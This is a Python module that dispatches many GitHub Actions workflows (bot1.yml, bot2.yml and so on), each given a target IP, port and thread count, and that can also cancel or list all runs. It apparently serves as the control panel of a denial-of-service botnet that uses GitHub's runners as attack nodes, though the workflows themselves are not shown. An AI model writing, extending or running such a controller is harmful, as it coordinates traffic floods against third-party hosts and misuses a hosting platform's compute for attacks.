# services/github.py
import requests
import time
import logging
from database import get_github_config

logger = logging.getLogger(__name__)

def trigger_workflow(workflow_file, ip, port, threads):
    cfg = get_github_config()
    if not cfg["token"] or not cfg["repo"]:
        return False
    
    url = f"https://api.github.com/repos/{cfg['repo']}/actions/workflows/{workflow_file}/dispatches"
    headers = {
        "Authorization": f"Bearer {cfg['token']}",
        "Accept": "application/vnd.github+json"
    }
    data = {
        "ref": "main",
        "inputs": {
            "target_ip": ip,
            "target_port": str(port),
            "threads": str(threads)
        }
    }
    
    try:
        r = requests.post(url, headers=headers, json=data, timeout=10)
        return r.status_code == 204
    except Exception as e:
        logger.error(f"Trigger {workflow_file} failed: {e}")
        return False

def launch_all(ip, port, threads):
    cfg = get_github_config()
    count = 0
    for i in range(1, cfg["count"] + 1):
        if trigger_workflow(f"bot{i}.yml", ip, port, threads):
            count += 1
        time.sleep(1)
    return count

def cancel_all():
    cfg = get_github_config()
    url = f"https://api.github.com/repos/{cfg['repo']}/actions/runs?status=in_progress&per_page=100"
    headers = {"Authorization": f"Bearer {cfg['token']}"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        cancelled = 0
        for run in r.json().get("workflow_runs", []):
            cancel_url = f"https://api.github.com/repos/{cfg['repo']}/actions/runs/{run['id']}/cancel"
            requests.post(cancel_url, headers=headers, timeout=10)
            cancelled += 1
        return cancelled
    except:
        return 0

def get_all_runs():
    cfg = get_github_config()
    url = f"https://api.github.com/repos/{cfg['repo']}/actions/runs?per_page=100"
    headers = {"Authorization": f"Bearer {cfg['token']}"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            return {}
        status = {}
        for run in r.json().get("workflow_runs", []):
            path = run["path"].split("/")[-1]
            if path not in status:
                status[path] = run["status"]
        return status
    except:
        return {}

def test_connection():
    cfg = get_github_config()
    try:
        r = requests.get("https://api.github.com/rate_limit",
                        headers={"Authorization": f"Bearer {cfg['token']}"},
                        timeout=10)
        return r.status_code == 200
    except:
        return False